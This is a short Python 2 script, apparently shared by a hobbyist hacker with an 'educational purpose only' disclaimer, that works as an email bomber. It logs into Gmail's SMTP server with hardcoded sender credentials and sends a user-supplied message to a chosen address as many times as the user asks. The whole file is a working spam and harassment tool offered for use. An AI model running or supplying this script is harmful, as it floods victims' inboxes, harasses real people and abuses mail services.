import os
import sys
import webbrowser
import smtplib
import getpass
from sys import platform



"""
Educational purpose only
=====================================
I'm not responsible for your actions

Created By: TheTechHacker
=============================
SUBSCRIBE: https://www.youtube.com/channel/UCKAmv8p_TRvUNrJlfiB8qBQ

This is a simple script to bomb email address
meaning This script will spam emails
"""

if platform == "linux" or platform == "linux2":
    os.system("clear")
elif platform == "darwin":
    os.system("clear")
elif platform == "win32":
    os.system("cls")
else:
    print "\033[1;34m Unknown System Detected \033[1;m"


print"""
  
  \033[1;32m                  email bomber                       
  \033[1;34;40m ============================================= \033[1;m
  \033[1;34;40m        Created By: hackersoft.ml              \033[1;m
  \033[1;34;40m ============================================= \033[1;m

      \033[1;m                          
"""

try:
    print "\033[1;32m"
    gmail = "fakebombmail@gmail.com"
    passwd = "passEG387"
    msg = raw_input("Message: ")
    to = raw_input("To: ")

    send = input("Count: ")
    print "\033[1;m"
except KeyboardInterrupt:
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except EOFError:
    exit("\033[1;34m ERROR \033[1;m")

try:
    print "\033[1;32m"
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(gmail, passwd)
    for e in range(0, +send):
        server.sendmail(gmail, to, msg)
        print (e)
    print "\033[1;m"
except KeyboardInterrupt:
    exit("\033[1;34m [-]Canceled By User \033[1;m")
